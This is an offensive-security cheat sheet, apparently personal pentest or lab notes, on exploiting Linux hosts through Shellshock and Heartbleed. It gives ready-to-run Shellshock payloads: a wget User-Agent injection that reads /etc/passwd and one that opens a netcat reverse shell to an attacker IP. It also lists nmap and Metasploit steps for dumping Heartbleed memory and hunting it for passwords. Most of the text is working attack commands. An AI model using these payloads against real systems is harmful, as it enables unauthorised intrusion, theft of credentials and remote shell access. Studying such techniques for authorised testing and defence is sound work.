# Linux Host

--- 

### Exploiting Shellshock

Is it a Linux host with a script in the /cgi-bin directory?

a) determine if system/programs are vulnerable to shellshock:
- locate cgi files on the server: `dirsearch.py -u http://<ip_address>/ -e cgi -r`
- or use `dirb`/`dirbuster`/`gobuster`

b) confirm you can access the file 
- i.e. `http://<ip_address>/cgi-bin/login.cgi`

c) test if the program is vulnerable to shellshock:
- with nmap NSE: `nmap --script http-shellshock --script-args uri=/cgi-bin/login/cgi <ip_address> -p 80`
- or use Nikto: `nikto -h <ip>`

d) if vulnerable, try to execute commands on the target:
-  i.e. `wget -U "() { foo;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://192.168.22.2/cgi-bin/login.cgi && cat login.cgi`
-  this command issues a GET request to the target system, uses a Shellshock-ified `User-Agent` (`-U`) to `echo` the contents of the `/etc/passwd` file to a local file on the attacker system (`login.cgi`), and will then display its contents (`&& cat login.cgi`) -- if successful, the contents of the target systems' `/etc/passwd` file will be displayed in your terminal

e) if you can execute commands, create a web shell on the target:
- first, setup, on the attacker system, a netcat listener (i.e. `nc -lvnp 1234`)
-  then execute the `wget` command, but this time with a netcat reverse shell payload as part of the `User-Agent` (`-U`) string against the target system: `wget -U "() { foo;};echo; /bin/nc <attacker_ip> <port> -e /bin/sh" http://<target_ip>/cgi-bin/login.cgi`
-  if successful, you should get back a reverse shell from the target and you can begin your post-exploitation activities
- or use Metasploit to exploit with `exploit/multi/http/apache_mod_cgi_bash_env_exec` exploit 

<br> 

--- 

### Exploiting Heartbleed

- OpenSSL versions 1.0.1 through 1.0.1f are vulnerable to Heartbleed and this vulnerability lets you read encrypted data stored in memory 

<br>

a) test if system is vulnerable to Heartbleed with nmap NSE:
- `nmap --script ssl-heartbleed <ip_address>` 

b) if vulnerable, use Metasploit to exploit:
- `use auxiliary/scanner/ssl/openssl_heartbleed` -> set options (in most scenarios you can stick with the defaults) -> `show actions` (to see possible auxiliary actions you can run -- in this case `DUMP`) -> `run` -- Metasploit will store the results of the "leaked" data to a file in your `~/.msf4/loot` directory as a `.bin` file 
- you can then run the `strings` command against the `.bin` file to see if you were able to leak anything that could be used (i.e. usernames, passwords, etc.)
- note, if you don't get any "leaked" data the first time your run a script or tool that exploits Heartbleed, run the tool again as you will find that different contents appear at different times within the leaked memory segment of an application